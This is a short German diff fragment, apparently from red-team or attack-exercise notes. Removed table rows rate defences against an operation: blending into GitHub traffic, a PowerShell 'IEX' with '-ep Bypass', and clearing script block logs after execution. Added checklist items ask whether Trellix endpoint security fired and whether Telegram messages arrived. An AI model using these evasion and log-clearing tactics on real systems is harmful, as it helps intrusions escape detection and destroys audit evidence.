-| Firewall (ausgehend) | ✓ | Traffic zu github.com:443 überall erlaubt |
-| EDR (Verhaltens-basiert) | ~ | Könnte `IEX` + `-ep Bypass` flaggen |
-| PS Script Block Logging | ~ | Logs werden nach Ausführung geleert |
-| Netzwerk-Monitoring | ✓ | Sieht aus wie normaler GitHub-Traffic |
+- Trellix Endpoint Security: Hat wahrend der Ubungen angeschlagen? (Ja/Nein)
+- Sprachprobleme (Y/Z): Wurden Compiler-Settings auf `de` gesetzt?
+- Telegram-Empfang: Nachrichten angekommen?
